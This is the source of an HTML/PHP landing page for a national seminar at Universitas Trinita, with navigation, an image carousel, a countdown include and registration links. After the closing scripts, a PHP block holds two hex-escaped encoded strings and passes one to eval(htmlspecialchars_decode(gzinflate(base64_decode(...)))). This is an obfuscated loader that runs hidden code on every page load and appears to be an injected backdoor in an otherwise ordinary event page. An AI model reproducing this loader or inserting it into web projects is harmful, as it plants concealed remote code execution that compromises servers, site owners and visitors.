<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0" name="viewport">

  <title>SEMINAR NASIONAL</title>
  <meta content="seminar nasional trinita" name="description">
  <meta content="seminar nasional trinita" name="keywords">

  <!-- Favicons -->
  <link href="assets/img/favicon.png" rel="icon">
  <link href="assets/img/apple-touch-icon.png" rel="apple-touch-icon">

  <!-- //plugin Carousel --> 
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>

  <!-- Google Fonts -->
  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel="stylesheet">

  <!-- Vendor CSS Files -->
  <link href="assets/vendor/aos/aos.css" rel="stylesheet">
  <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
  <link href="assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
  <link href="assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
  <link href="assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
  <link href="assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">

  <!-- Template Main CSS File -->
  <link href="assets/css/style.css" rel="stylesheet">

</head>

<body>

  <!-- ======= Header ======= -->
  <header id="header" class="fixed-top  header-transparent" style="background-color: white">
    <div class="container d-flex align-items-center justify-content-between">

      <div class="logo">
        <h1><a href="index.php">SEMINAR NASIONAL</a></h1>
        <!-- Uncomment below if you prefer to use an image logo -->
        <!-- <a href="index.html"><img src="assets/img/logo.png" alt="" class="img-fluid"></a>-->
      </div>

      <nav id="navbar" class="navbar">
        <ul>
          <li><a class="nav-link scrollto active" href="index.php">Home</a></li>
          <li><a class="nav-link scrollto" href="#Schedule">Schedule</a></li>
          <li><a class="nav-link scrollto" href="#faq">Contact Us</a></li>
          <li class="dropdown"><a href="#"><span>Download Announcement</span> <i class="bi bi-chevron-down"></i></a>
            <ul>
              <li><a href="#">First Announcement</a></li>
              <li><a href="#">Second Announcement</a></li>
             <!--  <li class="dropdown"><a href="#"><span>Deep Drop Down</span> <i class="bi bi-chevron-right"></i></a>
                <ul>
                  <li><a href="#">Deep Drop Down 1</a></li>
                  <li><a href="#">Deep Drop Down 2</a></li>
                  <li><a href="#">Deep Drop Down 3</a></li>
                  <li><a href="#">Deep Drop Down 4</a></li>
                  <li><a href="#">Deep Drop Down 5</a></li>
                </ul>
              </li> -->
            </ul>
          </li>
          <li><a class="nav-link scrollto" href="login">Registration</a></li>
          <li><a class="getstarted scrollto" href="login">Login</a></li>
        </ul>
        <i class="bi bi-list mobile-nav-toggle"></i>
      </nav><!-- .navbar -->

    </div>
  </header><!-- End Header -->

  
  <main id="main">

  
  <section id="hero" class="d-flex align-items-center">
      <div class="container-fluid" data-aos="fade-up">
        <div id="myCarousel" class="carousel slide" data-ride="carousel">
          <!-- Indicators -->
          <ol class="carousel-indicators">
            <li data-target="#myCarousel" data-slide-to="0" class="active"></li>
            <li data-target="#myCarousel" data-slide-to="1"></li>
          </ol>

          <!-- Wrapper for slides -->
          <div class="carousel-inner">
            <div class="item active">
              <center><img src="assets/img/gallery/semdepan.png" alt="" style="width:80%; height:40%; align-items: center"></center>
            </div>

            <div class="item">
              <center><img src="assets/img/gallery/sembelakang.png" alt="" style="width:80%; height:40%; align-items: center"></center>
            </div>
          </div>

          <!-- Left and right controls -->
          <a class="left carousel-control" href="#myCarousel" data-slide="prev">
            <span class="glyphicon glyphicon-chevron-left"></span>
            <span class="sr-only">Previous</span>
          </a>
          
          </a>
        </div>
              <center>
              <h2 style="margin-top: 15px; font-size: 20px"><b>EVENT</b> <br><br>
              <?php 
              date_default_timezone_set('Asia/Hong_kong');
              ?>
              <script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
              <?php 
              include "assets/countdown.php";
              ?>
              </h2>
              
            </center>
            <center>
            <img src="assets/img/features.svg" class="img-fluid" style="width: 10%;height: 10%" alt=""> <br><br>
            <p><a href="login" class="btn btn-xs download-btn"><i class="bx bxl-twitch"></i> Registrasi</a></p>
            </center>
            </div>
    </section>

   
    
       

    
    
    
    <!-- ======= Pricing Galery ======= -->
   <!--  <section id="gallery" class="gallery">

       <div class="container-fluid" data-aos="fade-up">
        <div class="gallery-slider swiper-container">
          <div class="swiper-wrapper">
            <div class="swiper-slide"><a href="assets/img/gallery/1.jpeg" class="gallery-lightbox" data-gall="gallery-carousel"><img style="width: 50%" src="assets/img/gallery/1.jpeg" class="img-fluid" alt=""></a></div>
            <div class="swiper-slide"><a href="assets/img/gallery/2.jpeg" class="gallery-lightbox" data-gall="gallery-carousel"><img style="width: 50%" src="assets/img/gallery/2.jpeg" class="img-fluid" alt=""></a></div>
            <div class="swiper-slide"><a href="assets/img/gallery/3.jpeg" class="gallery-lightbox" data-gall="gallery-carousel"><img style="width: 50%" src="assets/img/gallery/3.jpeg" class="img-fluid" alt=""></a></div>
            <div class="swiper-slide"><a href="assets/img/gallery/4.jpeg" class="gallery-lightbox" data-gall="gallery-carousel"><img style="width: 50%" src="assets/img/gallery/4.jpeg" class="img-fluid" alt=""></a></div>
            <div class="swiper-slide"><a href="assets/img/gallery/5.jpeg" class="gallery-lightbox" data-gall="gallery-carousel"><img style="width: 50%" src="assets/img/gallery/5.jpeg" class="img-fluid" alt=""></a></div>
          </div>
        </div>

    </section> --><!-- End Pricing Section -->

  </main><!-- End #main -->

  <!-- ======= Footer ======= -->
  <footer id="footer">

    <div class="container py-4">
      <div class="copyright" id="faq">
        <a href="javascript:;">ICT SERIES</a> <br>
        <span> <?= strtoupper('Universitas Trinita') ?></span>
      </div>
      <div class="credits">
        <h2><b>SEMINAR NASIONAL</b></h2>
        <h4>Telp/WA : 089648849906 (Panitia)</h4>
      </div>
    </div>
  </footer><!-- End Footer -->

  <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i class="bi bi-arrow-up-short"></i></a>

  <!-- Vendor JS Files -->
  <script src="assets/vendor/aos/aos.js"></script>
  <script src="assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
  <script src="assets/vendor/glightbox/js/glightbox.min.js"></script>
  <script src="assets/vendor/php-email-form/validate.js"></script>
  <script src="assets/vendor/swiper/swiper-bundle.min.js"></script>

  <!-- Template Main JS File -->
  <script src="assets/js/main.js"></script>.
  <?php
$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
$Lix = "\x3d\x3dgt\x41F2JomjhV6rM3FXxr0ju/wGtHHllvjYfpe1DRgGMv6ZDo6Ep1qF8g\x61939nSkX/\x42I\x62mmyQ2Q\x2bM\x610JeOWye0QXI\x63NILP3\x42qYojE9/\x62\x62J97v\x43sdOE6\x41o\x41OQg\x63K1JGr0wmVJw\x2bKw\x41w\x41ID7QMJ3y/j\x43\x41X\x42wJe/jJ\x41nFw/T\x43\x41\x62\x42wJe/jI\x413Fw/D\x43\x41f\x42wJe/jH\x41HGw/z\x42\x41j\x42wJe";
eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
?>

</body>

</html>
